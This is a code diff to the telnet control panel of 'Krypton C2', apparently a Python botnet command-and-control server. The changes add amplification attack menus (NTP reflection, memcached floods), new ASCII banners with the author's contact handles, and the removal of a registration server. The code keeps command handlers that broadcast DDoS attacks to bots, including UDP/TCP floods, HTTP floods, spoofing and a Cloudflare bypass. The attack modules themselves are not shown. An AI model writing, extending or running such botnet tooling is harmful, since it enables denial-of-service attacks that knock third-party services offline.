@@ -12,12 +12,13 @@ from src.Commands.Methods_L3.pod import pod
 # Layer 4
 from src.Commands.Methods_L4.junk import junk
 from src.Commands.Methods_L4.tcp import tcp
-from src.Commands.Methods_L4.ntp import ntp
-from src.Commands.Methods_L4.mem import mem
 from src.Commands.Methods_L4.udp import udp
 from src.Commands.Methods_L4.hex import hex
 from src.Commands.Methods_L4.tup import tup
 from src.Commands.Methods_L4.syn import syn
+# AMP METHODS
+from src.Commands.Methods_L4.ntp import ntp
+from src.Commands.Methods_L4.mem import mem
 
 # Layer 7
 from src.Commands.Methods_L7.httpio import httpio
@@ -36,14 +37,39 @@ from datetime import datetime, timedelta
 from colorama import Fore, init
 
 
-def text2Gen():
-    word = '''
-
-     ( Type "help" for Commands )      
-        ( Discord: cirqueira )        
-
+banner2 = '''
+    ██ ▄█▀ ██▀███ ▓██   ██▓ ██▓███  ▄▄▄█████▓ ▒█████   ███▄    █ 
+    ██▄█▒ ▓██ ▒ ██▒▒██  ██▒▓██░  ██▒▓  ██▒ ▓▒▒██▒  ██▒ ██ ▀█   █ 
+    ▓███▄░ ▓██ ░▄█ ▒ ▒██ ██░▓██░ ██▓▒▒ ▓██░ ▒░▒██░  ██▒▓██  ▀█ ██▒
+    ▓██ █▄ ▒██▀▀█▄   ░ ▐██▓░▒██▄█▓▒ ▒░ ▓██▓ ░ ▒██   ██░▓██▒  ▐▌██▒
+    ▒██▒ █▄░██▓ ▒██▒ ░ ██▒▓░▒██▒ ░  ░  ▒██▒ ░ ░ ████▓▒░▒██░   ▓██░
+    ▒ ▒▒ ▓▒░ ▒▓ ░▒▓░  ██▒▒▒ ▒▓▒░ ░  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
+    ░ ░▒ ▒░  ░▒ ░ ▒░▓██ ░▒░ ░▒ ░         ░      ░ ▒ ▒░ ░ ░░   ░ ▒░
+    ░ ░░ ░   ░░   ░ ▒ ▒ ░░  ░░         ░      ░ ░ ░ ▒     ░   ░ ░ 
+    ░  ░      ░     ░ ░                           ░ ░           ░ 
+                    ░ ░                                           
+                 ( Type "help" for Commands )      
+                    ( Discord: cirqueira )     
 '''
-# ─────
+
+banner1 = '''
+    ▄ •▄ ▄▄▄   ▄· ▄▌ ▄▄▄·▄▄▄▄▄       ▐ ▄ 
+    █▌▄▌▪▀▄ █·▐█▪██▌▐█ ▄█•██  ▪     •█▌▐█
+    ▐▀▀▄·▐▀▀▄ ▐█▌▐█▪ ██▀· ▐█.▪ ▄█▀▄ ▐█▐▐▌
+    ▐█.█▌▐█•█▌ ▐█▀·.▐█▪·• ▐█▌·▐█▌.▐▌██▐█▌
+    ·▀  ▀.▀  ▀  ▀ • .▀    ▀▀▀  ▀█▄▀▪▀▀ █▪                                         
+        ( Type "help" for Commands )      
+           ( Discord: cirqueira )        
+'''
+
+bannerLogin = '''
+            ( Discord: cirqueira )
+          ( Telegram: CirqueiraDev )
+        Thank you for using Krypton C2
+'''
+
+def text2Gen(word):
+
     start_color = (0, 0, 200)
     end_color   = (255, 0, 0)
 
@@ -89,7 +115,9 @@ def color(data_input_output):
 lightwhite = color("LIGHTWHITE_EX")
 gray = color("LIGHTBLSYN_EX")
 
-banner = text2Gen()
+banner1 = text2Gen(banner1)
+banner2 = text2Gen(banner2)
+bannerLogin = text2Gen(bannerLogin)
 
 rules = f"""
 {lightwhite}1. {gray}Do not attSYN .gov/.gob/.edu/.mil domains
@@ -131,8 +159,6 @@ Methods_AMP = f"""
 
 Methods_L4 = f"""
 {gray}L4 Methods:
-{lightwhite}.NTP               {gray}NTP Reflection flood
-{lightwhite}.MEM               {gray}Memcached Flood 
 {lightwhite}.UDP               {gray}UDP Flood  
 {lightwhite}.TCP               {gray}TCP Flood             
 {lightwhite}.TUP               {gray}TCP and UDP Flood
@@ -144,7 +170,7 @@ Methods_L4 = f"""
 Methods_L7 = f"""
 {gray}L7 Methods:
 {lightwhite}.HTTPIO            {gray}HTTP IO Stresser
-{lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass attSYN      
+{lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass     
 {lightwhite}.HTTPGET           {gray}HTTP GET requests attSYN
 {lightwhite}.HTTPSPOOF         {gray}HTTP GET Spoofing
 {lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests
@@ -164,12 +190,11 @@ tools = f"""
 
 admin_commands = f"""
 {gray}Admin Commands:
-{lightwhite}!REG                {gray}Starts registration server
 {lightwhite}!USER               {gray}Add/List/remove users
 """
 
 # LOL...
-botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_L7}{GameMethods}"""
+botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_AMP}{Methods_L7}{GameMethods}"""
 
 bots = {}
 user_name = ""
@@ -264,17 +289,20 @@ def captcha(send, client, grey):
         send(client, f'{grey}Wrong!')
         time.sleep(0.1)
         client.close()
+        return
 
 # Client handler
 def handle_client(client, address):
     send(client, "\33]0;Krypton C2 | Login\a")
-    send(client, f'\x1bKrypton | Login: Awaiting Response...\a', False)
+    send(client, f'\x1bKrypton C2 | Login: Awaiting Response...\a', False)
     send(client, ansi_clear, False)
     send(client, f'{color("LIGHTBLSYN_EX")}Connecting...')
     captcha(send, client, color("LIGHTBLSYN_EX"))
     time.sleep(1)
     while 1:
         send(client, ansi_clear, False)
+        for x in bannerLogin.split('\n'):
+            send(client, '\x1b[3;31;48m'+ x)
         send(client, f'\x1b{gray}Username :\x1b[0m ', False, False)
         username = client.recv(1024).decode().strip()
         if not username:
@@ -375,10 +403,14 @@ def user(args, send, client):
     except:
         send(client, '\n!USER ADD/LIST/REMOVE\n')
 
-def clear(client):
+def clear(client, command):
     send(client, ansi_clear, False)
-    for x in banner.split('\n'):
-        send(client, '\x1b[3;31;48m'+ x)
+    if command == 'CLS' or command == 'CLEAR':
+        for x in banner2.split('\n'):
+            send(client, x)
+    else:
+        for x in banner1.split('\n'):
+            send(client, x)
 
 # Updates Shell Title
 def update_title(client, name, expires):
@@ -391,7 +423,7 @@ def update_title(client, name, expires):
 
 # Telnet Command Line
 def command_line(client, username):
-    for x in banner.split('\n'):
+    for x in banner2.split('\n'):
         send(client, x)
 
     prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}Krypton{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
@@ -407,7 +439,7 @@ def command_line(client, username):
             command = args[0].upper()
             print(user_name, args)
 
-            clear(client)
+            clear(client, command)
 
             if command == 'HELP':
                 for x in help.split('\n'):
@@ -429,6 +461,10 @@ def command_line(client, username):
                 for x in Methods_L7.split('\n'):
                     send(client, '\x1b[3;31;40m'+ x)
 
+            elif command == 'AMP' or command == 'AMPLIFICATION':
+                for x in Methods_AMP.split('\n'):
+                    send(client, '\x1b[3;31;40m'+ x)
+
             elif command == 'METHODS':
                 for x in showMethods.split('\n'):
                     send(client, '\x1b[3;31;40m'+ x)
@@ -443,7 +479,7 @@ def command_line(client, username):
             
             elif command == 'CLEAR' or command == 'CLS':
                 send(client, ansi_clear, False)
-                for x in banner.split('\n'):
+                for x in banner2.split('\n'):
                     send(client, '\x1b[3;31;48m'+ x)
             
             elif command == 'LOGOUT' or command == 'EXIT':
@@ -458,11 +494,6 @@ def command_line(client, username):
                 if user_name == "root":
                     for x in admin_commands.split('\n'):
                         send(client, x)
-            
-            elif command == '!R' or command == '!REG' or command == '!REGISTER':
-                if user_name == "root":
-                    threading.Thread(target=reg_main).start()
-                    send(client, f'{Fore.CYAN}\nStarted registration server.\n')
             
             elif command == '!USER' or command == '!U':
                 if user_name == "root":
@@ -510,7 +541,7 @@ def command_line(client, username):
             elif command == '.VSE': # VSE Flood
                 vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
 
-            elif command == '.HTTPSTORM': # HTTP request attSYN
+            elif command == '.HTTPSTORM': # HTTP request
                 httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data)
 
             elif command == '.HTTPIO': # FULL POWER !!!
@@ -519,10 +550,10 @@ def command_line(client, username):
             elif command == '.HTTPSPOOF': # HTTP GET SPOOF
                 httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data)
 
-            elif command == '.HTTPGET': # HTTP request attSYN
+            elif command == '.HTTPGET': # HTTP request 
                 httpget(args, validate_time, send, client, ansi_clear, broadcast, data)
             
-            elif command == '.HTTPCFB': # HTTP cloudflare bypass attSYN
+            elif command == '.HTTPCFB': # HTTP cloudflare bypass
                 httpcfb(args, validate_time, send, client, ansi_clear, broadcast, data)
             
             send(client, prompt, False)
@@ -532,12 +563,12 @@ def command_line(client, username):
 
 screenedSuccessfully = """
                               
- [ Successfully Screened ]
-        Krypton C2
-───────────────────────────    
-         ( Logs )
+    [ %sSuccessfully Screened%s ]
+            %sKrypton C2%s
+    ───────────────────────────    
+            ( %sLogs%s )
 
-"""
+"""%(Fore.GREEN, Fore.WHITE, Fore.CYAN, Fore.WHITE, Fore.LIGHTBLUE_EX, Fore.WHITE)
 
 
 def register(client, address, send):
@@ -588,41 +619,13 @@ def register(client, address, send):
     except:
         send(client, "Error.")
 
-def reg_main():
-    with open("src/config.json") as jsonFile:
-        jsonObject = json.load(jsonFile)
-        jsonFile.close()
-
-    reg_port = int(jsonObject['reg_port'])
-    reg_host = jsonObject['reg_host']
-
-    init(convert=True)
-
-    sock = socket.socket()
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-    try:
-        sock.bind((reg_host, reg_port))
-    except:
-        print('\x1b[3;31;40m Failed to bind port')
-        exit()
-
-    sock.listen()
-    threading.Thread(target=register, args=[*sock.accept(), send]).start()
-
 def main():
     with open("src/config.json", encoding="utf-8") as jsonFile:
         jsonObject = json.load(jsonFile)
         jsonFile.close()
 
     cnc_port = int(jsonObject['cnc_port'])
-    reg_port = int(jsonObject['reg_port'])
     cnc_host = jsonObject['cnc_host']
-
-    if cnc_port == reg_port:
-        print("Cnc port and registration port must be different from eachother.")
-        exit()
 
     init(convert=True)
 
